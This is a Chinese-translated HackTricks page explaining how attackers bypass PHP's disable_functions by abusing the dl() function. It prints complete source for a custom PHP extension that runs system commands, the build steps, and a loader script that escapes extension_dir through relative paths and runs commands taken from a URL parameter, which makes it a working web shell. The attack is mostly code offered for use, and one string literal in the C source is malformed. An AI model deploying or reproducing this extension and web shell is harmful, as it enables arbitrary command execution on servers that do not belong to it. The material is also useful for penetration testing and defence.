<details>

<summary><strong>从零到英雄学习AWS黑客攻击</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您想在**HackTricks中看到您的公司广告**或**下载HackTricks的PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在**Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。**

</details>

**重要说明：**

![image](https://user-images.githubusercontent.com/84577967/174675487-a4c4ca06-194f-4725-85af-231a2f35d56c.png)

**`dl`** 是一个PHP函数，可用于加载PHP扩展。如果该函数没有被禁用，它可能被滥用以**绕过`disable_functions`并执行任意命令**。\
然而，它有一些严格的限制：

* `dl` 函数必须在**环境中存在**且**未被禁用**
* PHP扩展**必须与服务器使用的相同主版本**（PHP API版本）编译（您可以在phpinfo的输出中看到这个信息）
* PHP扩展必须位于由**`extension_dir`** 指令**定义的目录**中（您可以在phpinfo的输出中看到它）。攻击者试图滥用服务器时，很不可能有权限写入这个目录，所以这个要求可能会阻止您滥用这种技术）。

**如果您满足这些要求，请继续阅读从** [**https://antichat.com/threads/70763/**](https://antichat.com/threads/70763/) **复制的帖子，了解如何绕过disable\_functions**

当管理员配置服务器时，他/她忽略了[dl函数](http://www.php.net/manual/en/function.dl.php)并没有禁用它，因为没有提到能够执行系统命令。\
[dl函数](http://www.php.net/manual/en/function.dl.php)用于在脚本执行时加载PHP扩展。\
\
（PHP扩展是用C/C++编写的，用于给PHP增加更多功能。）\
\
攻击者注意到该函数没有被禁用，并看到了潜力，决定创建一个PHP扩展。\
攻击者使用一个小脚本`<?php echo 'PHP Version is '.PHP_VERSION; ?>`（PHP\_VERSION是一个预定义常量，包含PHP的版本号。）检查PHP的版本。\
\
攻击者记录下版本号，并从[PHP网站](http://www.php.net/downloads.php)下载tarball，在这个场景中，版本比当前发布的版本旧，所以攻击者必须去[档案馆](http://museum.php.net)。\
\
接下来他提取源代码并[编译和安装](http://www.php.net/manual/en/install.php)在他自己的盒子上的PHP版本。\
\
现在是时候创建扩展了\
攻击者从PHP网站上阅读了[创建PHP扩展](http://www.php.net/manual/en/zend.creating.php)的资料。\
在阅读了文档并创建了一些自己的扩展后，他决定查看PHP代码库，因为他追求的功能已经创建好了。\
\
将要复制的功能是[exec函数](http://www.php.net/manual/en/function.exec.php)\
在代码库中，它位于ext/standard/exec.c\
\
相关部分被实现到了它自己的新扩展中。\
\

**注意：**

在开始编译代码之前，您应该注意两点：

1- `bypass.c` 文件中的 `ZEND_MODULE_API_NO` 的值必须更改为您正在使用的当前 `Zend Extension Build`，您可以使用下面的命令行获取它：
```bash
php -i | grep "Zend Extension Build" |awk -F"API4" '{print $2}' | awk -F"," '{print $1}'
```
2- 如果您在编译最新版本的 PHP（5、7 和 8）中的 bypass.c 文件时遇到任何错误，您可以将 PHP_FUNCTION(bypass_exec) 更改为以下内容：
```
PHP_FUNCTION(bypass_exec)
{
FILE *in;
char *command;
size_t command_len;
zend_string *ret;
php_stream *stream;

ZEND_PARSE_PARAMETERS_START(1, 1)
Z_PARAM_STRING(command, command_len)
ZEND_PARSE_PARAMETERS_END();

if (!command_len) {
zend_argument_value_error(1, "cannot be empty");
RETURN_THROWS();
}
if (strlen(command) != command_len) {
zend_argument_value_error(1, "must not contain any null bytes");
RETURN_THROWS();
}

#ifdef PHP_WIN32
if ((in=VCWD_POPEN(command, "rt"))==NULL) {
#else
if ((in=VCWD_POPEN(command, "r"))==NULL) {
#endif
php_error_docref(NULL, E_WARNING, "Unable to execute '%s'", command);
RETURN_FALSE;
}

stream = php_stream_fopen_from_pipe(in, "rb");
ret = php_stream_copy_to_mem(stream, PHP_STREAM_COPY_ALL, 0);
php_stream_close(stream);

if (ret && ZSTR_LEN(ret) > 0) {
RETVAL_STR(ret);
}
}
```
文件对于单独的扩展最终如下所示：

{% code title="bypass.c" %}
```c
/*
+----------------------------------------------------------------------+
| Copyright (c) 1997-2003 The PHP Group                                |
+----------------------------------------------------------------------+
| This source file is subject to version 2.02 of the PHP license,      |
| that is bundled with this package in the file LICENSE, and is        |
| available at through the world-wide-web at                           |
| http://www.php.net/license/2_02.txt.                                 |
| If you did not receive a copy of the PHP license and are unable to   |
| obtain it through the world-wide-web, please send a note to          |
| license@php.net so we can mail you a copy immediately.               |
+----------------------------------------------------------------------+
*/


#ifdef HAVE_CONFIG_H
#include "config.h"
#endif

#include "php.h"
#include "php_bypass.h"

static function_entry bypass_functions[] = {
PHP_FE(bypass_exec, NULL)
{NULL, NULL, NULL}
};

zend_module_entry bypass_module_entry = {
#if ZEND_MODULE_API_NO >= 20010901
STANDARD_MODULE_HEADER,
#endif
PHP_BYPASS_EXTNAME,
bypass_functions,
NULL,
NULL,
NULL,
NULL,
NULL,
#if ZEND_MODULE_API_NO >= 20010901
PHP_BYPASS_VERSION,
#endif
STANDARD_MODULE_PROPERTIES
};

#ifdef COMPILE_DL_BYPASS
ZEND_GET_MODULE(bypass)
#endif


PHP_FUNCTION(bypass_exec){
FILE *in;
int readbytes, total_readbytes=0, allocated_space;
pval **cmd;
char *ret;

if (ZEND_NUM_ARGS()!=1 || zend_get_parameters_ex(1, &cmd)==FAILURE) {
WRONG_PARAM_COUNT;
}

convert_to_string_ex(cmd);
#ifdef PHP_WIN32
if ((in=VCWD_POPEN(Z_STRVAL_PP(cmd), "rt"))==NULL) {
#else
if ((in=VCWD_POPEN(Z_STRVAL_PP(cmd), "r"))==NULL) {
#endif
php_error_docref(NULL TSRMLS_CC, E_WARNING, "Unable to execute '%s'", Z_STRVAL_PP(cmd));
RETURN_FALSE;
}

allocated_space = EXEC_INPUT_BUF;
ret = (char *) emalloc(allocated_space);

while (1) {
readbytes = fread(ret+total_readbytes, 1, EXEC_INPUT_BUF, in);
if (readbytes<=0) {
break;
}

total_readbytes += readbytes;
allocated_space = total_readbytes+EXEC_INPUT_BUF;
ret = (char *) erealloc(ret, allocated_space);
}

pclose(in);

RETVAL_STRINGL(ret, total_readbytes, 0);
Z_STRVAL_P(return_value)[total_readbytes] = '\';
}
```
{% endcode %}

{% code title="php_bypass.h" %}
```c
#ifndef PHP_BYPASS_H
#define PHP_BYPASS_H 1

#define PHP_BYPASS_VERSION "1.0"
#define PHP_BYPASS_EXTNAME "bypass"

PHP_FUNCTION(bypass_exec);

extern zend_module_entry bypass_module_entry;
#define phpext_bypass_ptr &bypass_module_entry

#endif
```
{% endcode %}

{% code title="config.m4" %}
```bash
PHP_ARG_ENABLE(bypass, [whether to enable bypass support],[--enable-bypass])

if test "$PHP_BYPASS" = "yes"; then
AC_DEFINE(HAVE_BYPASS, 1, [Whether you have bypass])
PHP_NEW_EXTENSION(bypass, bypass.c, $ext_shared)
fi
```
{% endcode %}

创建文件后，是时候构建PHP扩展了。
```
phpize
./configure
make
```
完成后，编译后的扩展将位于带有文件名bypass.so的modules子目录中。
文件被复制到一个安全的地方，现在执行以下命令来清理新创建的文件。
```
make clean
phpize --clean
```
攻击者现在将新创建的扩展上传到受害主机。

（注意：PHP的主要版本使用不同的API版本，为了能够在一个主机上编译扩展并上传到另一个主机，API版本必须匹配。这就是为什么最初在攻击者的机器上安装相同PHP版本的原因。）

为了使用dl函数加载扩展，扩展需要位于由extension_dir指令定义的扩展目录中。
这可能是一个问题，因为攻击者不太可能拥有该目录的写权限，但是有办法解决这个问题。
开发人员在dl函数页面的注释部分讨论了这个问题。

讨论的概念是使用从定义的扩展目录的相对路径。
例如，如果扩展目录设置为/usr/php/extensions，并且你想在当前的web目录/home/example.com/html中加载bypass.so，你可以按照以下方式操作：
```php
<?php
dl('../../../home/example.com/html/bypass.so');
?>
```
此方法可以绕过需要将扩展放在定义的扩展目录中的限制。

还有一种自动化的方法，这样您就不必为不同的主机更改相对路径，这段代码是由 endofyourself \[at\] yahoo \[dot\] com 创建，并由 mag\_2000 \[at\] front \[dot\] ru 后来进行了改进。

该函数有一个小问题，在某些主机上，扩展目录被设置为 "./"，这个函数没有考虑到如果扩展目录被设置为相对路径的情况，解决这个问题的方法是使用 realpath 函数。

最终用于加载扩展并执行系统命令以绕过禁用函数的脚本如下：
```php
<?php

function dl_local( $extensionFile ) {
if(!(bool)ini_get('enable_dl')
||(bool)ini_get('safe_mode')){
die('Loading extensions is not permitted.');
}

if(!file_exists($extensionFile)){
die('File '.$extensionFile.' does not exist.');
}

if(!is_executable($extensionFile)){
die('File '.$extensionFile.' is not executable. ( chmod +x '.$extensionFile.' )');
}

$currentDir = getcwd().'/';
$currentExtPath = realpath(ini_get('extension_dir'));

$subDirs = preg_match_all("/\//",$currentExtPath ,$matches);
unset($matches);

if(!(bool)$subDirs){
die('Could not determine a valid extension path [extension_dir]');
}

$extPathLastChar=strlen($currentExtPath )-1;

if($extPathLastChar==strrpos($currentExtPath,'/')){
$subDirs--;}$backDirStr = '';

for($i = 1; $i <= $subDirs; $i++){
$backDirStr .='..';
if($i != $subDirs){
$backDirStr .='/';
}
}

$finalExtPath = $backDirStr.$currentDir.$extensionFile;
if(!dl($finalExtPath)){
die();
}


$loadedExtensions = get_loaded_extensions();
$thisExtName = $loadedExtensions[sizeof($loadedExtensions)-1];
return $thisExtName;
}

@ini_set ('display_errors','1');
error_reporting(E_ALL);

dl_local('bypass.so');

if(@$_GET['cmd']){
$output = bypass_exec($_GET['cmd']);
echo '<pre>'.$output.'</pre>';
}
?>
```
攻击者现在只需调用带有所需命令的 cmd 变量的脚本 URL 即可执行命令。
```
http://www.example.com/script.php?cmd=ls
```
<details>

<summary><strong>从零开始学习AWS黑客攻击直到成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式:

* 如果您想在**HackTricks中看到您的公司广告**或**下载HackTricks的PDF版本**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>
